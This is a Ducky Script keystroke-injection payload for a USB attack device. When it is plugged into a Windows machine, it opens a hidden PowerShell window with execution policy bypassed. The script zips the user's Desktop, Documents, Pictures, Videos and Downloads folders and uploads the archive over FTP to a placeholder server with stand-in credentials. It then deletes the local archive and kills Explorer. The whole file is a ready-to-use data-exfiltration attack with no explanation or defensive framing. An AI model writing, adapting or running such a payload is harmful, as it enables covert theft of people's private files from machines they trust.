DELAY 1000
GUI r
DELAY 300
STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
ENTER
DELAY 500
STRING $ftp="ftp://yourftp.com";$user="ftpuser";$pass="ftppass";
ENTER
STRING $zip="$env:TEMP\p.zip";Add-Type -A System.IO.Compression.FileSystem;
ENTER
STRING $targets=@("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos","$env:USERPROFILE\Downloads");
ENTER
STRING [IO.Compression.ZipFile]::CreateFromDirectory($targets[0],$zip);
ENTER
STRING foreach($d in $targets[1..($targets.Count-1)]){try{[IO.Compression.ZipFile]::CreateFromDirectory($d,"$env:TEMP\temp.zip");[IO.Compression.ZipFile]::Open($zip,[IO.Compression.ZipArchiveMode]::Update).CreateEntryFromFile("$env:TEMP\temp.zip","$(Split-Path $d -Leaf).zip");Remove-Item "$env:TEMP\temp.zip";}catch{}}
ENTER
STRING $wc=New-Object Net.WebClient;$wc.Credentials=New-Object Net.NetworkCredential($user,$pass);$wc.UploadFile("$ftp/p.zip",$zip);
ENTER
STRING Remove-Item $zip -Force;Stop-Process -Name explorer -Force;
ENTER
STRING exit
ENTER